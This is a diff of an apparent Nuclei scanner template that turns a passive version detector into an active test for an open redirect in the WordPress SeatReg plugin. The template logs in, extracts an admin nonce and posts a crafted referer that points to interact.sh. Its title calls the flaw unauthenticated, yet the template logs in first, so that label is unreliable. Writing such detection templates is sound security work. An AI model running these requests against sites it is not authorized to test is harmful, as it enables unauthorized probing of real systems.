@@ -1,22 +1,53 @@
-id: seatreg
+id: seatreg-redirect
 
 info:
-  name: Seatreg Plugin Detector (Non Intrusive)
+  name: WordPress Plugin ‘SeatReg’  - Unauthenticated Open Redirect
   author: Mariam Tariq
-  severity: info
-  description: Seatreg Plugin Detector "Vulnerable Version 1.23.0"
+  severity: medium
+  description: |
+    WordPress SeatReg plugin version 1.23.0 suffers from an open redirection vulnerability.
+  reference:
+    - https://packetstormsecurity.com/files/167888/WordPress-SeatReg-1.23.0-Open-Redirect.html
+  metadata:
+    verified: "true"
+  tags: wpscan,wp-plugin,wp,wordpress,authenticated,redirect
 
 requests:
-  - method: GET
-    path:
-      - '{{BaseURL}}/wp-content/plugins/seatreg/readme.txt'
+  - raw:
+      - |
+        POST /wp-login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
 
-    matchers-condition: and # execute both conditions then give the result
+        log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
+
+      - |
+        GET /wp-admin/admin.php?page=seatreg-welcome HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        POST /wp-admin/admin-post.php HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{RootURL}}
+        Content-Type: application/x-www-form-urlencoded
+
+        new-registration-name=test&action=seatreg_create_submit&seatreg-admin-nonce={{seatreg-admin-nonce}}&_wp_http_referer=http://interact.sh&submit=Create+new+registration
+
+    cookie-reuse: true
+    req-condition: true
     matchers:
-      - type: word
-        words:
-          - "Stable tag: 1.23.0"
+      - type: dsl
+        dsl:
+          - contains(all_headers_2, "text/html")
+          - 'status_code_3 == 302'
+          - contains(header_3, 'http://interact.sh')
+        condition: and
 
-      - type: status
-        status:
-          - 200
+    extractors:
+      - type: regex
+        name: seatreg-admin-nonce
+        part: body
+        group: 1
+        regex:
+          - '"seatreg\-admin\-nonce" value="([0-9a-z]+)"'
+        internal: true
